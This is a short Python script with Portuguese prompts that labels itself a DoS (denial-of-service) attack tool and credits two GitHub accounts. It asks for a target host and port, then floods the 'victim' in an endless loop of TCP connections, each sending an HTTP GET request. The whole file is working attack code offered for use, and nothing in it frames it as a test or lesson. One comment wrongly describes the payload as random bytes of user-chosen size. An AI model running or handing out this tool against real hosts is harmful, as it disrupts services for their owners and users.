import socket, os, time, sys, ipaddress

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

os.system('cls' if os.name == 'nt' else 'clear')

print("Ferramenta de ataque DoS (Denial of Service)")
print("Github: https://github.com/Bartzin55")
print("Github: https://github.com/bella4424")

#entrada do IP
ip_or_hostname = input("\nIP de destino(Apenas IPv4) ou Hosname: ")

#entrada da porta
strport = input("Porta de destino: ")

#validação da porta
try:
    port = int(strport)
except(TypeError, ValueError):
    print("Porta inválida.")
    sys.exit()
if port < 0 or port > 65535:
    print("Porta inválida.")
    sys.exit()

#gera um pacote de bytes aleatórios, do tamanho especificado pelo user
packet = (
    "GET / HTTP/1.1\r\n"
    f"Host: {ip_or_hostname}\r\n"
    "User-Agent: FloodTest/1.0\r\n"
    "Accept: */*\r\n"
    "Connection: keep-alive\r\n"
    "\r\n"
).encode()
destination = (ip_or_hostname, port)
confirmation = input("Iniciar envio de pacotes (y): ")

if confirmation == "y" or confirmation == "Y":
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"IP vítima: {ip_or_hostname}, porta: {port}")
    print("Iniciando, pare a qualquer momento com CONTROL+C...")
    time.sleep(5)

    packetcount = 1
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect(destination)
            sock.send(packet)
            sock.close()
            packetcount += 1
            print(f"Sent {packetcount} data packet to {ip_or_hostname}:{port}")
        except:
            print("Destination not found.")
            sys.exit()

else:
    print("\nOPERAÇÃO CANCELADA")
    sys.exit()